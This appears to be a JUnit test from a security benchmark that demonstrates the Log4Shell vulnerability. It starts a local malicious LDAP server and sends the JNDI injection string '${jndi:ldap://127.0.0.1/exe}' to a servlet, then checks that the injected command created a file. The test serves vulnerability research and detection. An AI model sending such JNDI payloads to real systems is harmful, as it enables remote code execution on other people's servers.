package scabench;

import org.junit.jupiter.api.*;
import org.junit.jupiter.api.condition.EnabledOnOs;
import org.junit.jupiter.api.condition.OS;
import org.springframework.mock.web.MockHttpServletRequest;
import org.springframework.mock.web.MockHttpServletResponse;
import java.io.File;
import java.io.IOException;
import static org.junit.jupiter.api.Assertions.assertTrue;


/**
 * Whitebox test demonstrating the injection.
 * @author jens dietrich
 */
public class Log4ShellTest {

    private static Process serverProcess = null;

    @BeforeAll
    public static void startServers() throws IOException, InterruptedException {
        serverProcess = new ProcessBuilder("java","-jar","dodgy-ldap-server.jar")
            .redirectOutput(ProcessBuilder.Redirect.INHERIT)
            .redirectError(ProcessBuilder.Redirect.INHERIT)
            .start();

        Thread.sleep(5_000);

    }

    @BeforeEach
    public void clearGeneratedFile() {
        File file = new File("foo");
        if (file.exists()) {
            Assumptions.assumeTrue(file.delete());
        }
    }

    @AfterAll
    public static void shutdownServers() {
        serverProcess.destroyForcibly();
    }

    @Test
    @EnabledOnOs({OS.MAC,OS.LINUX})   // run unix sh command, similar for win
    public void testVulnerability () throws Exception {

        // check that file to be created by injection does not yet exist
        File file = new File("foo");
        Assumptions.assumeFalse(file.exists());
        Assumptions.assumeTrue(serverProcess!=null);

        // whitebox service test
        MockHttpServletRequest request = new MockHttpServletRequest();
        MockHttpServletResponse response = new MockHttpServletResponse();
        HelloWorldService service = new HelloWorldService();
        service.init();
        request.addParameter("foo","${jndi:ldap://127.0.0.1/exe}");
        service.doGet(request,response);

        Thread.sleep(1000);
        assertTrue(file.exists());
    }

}
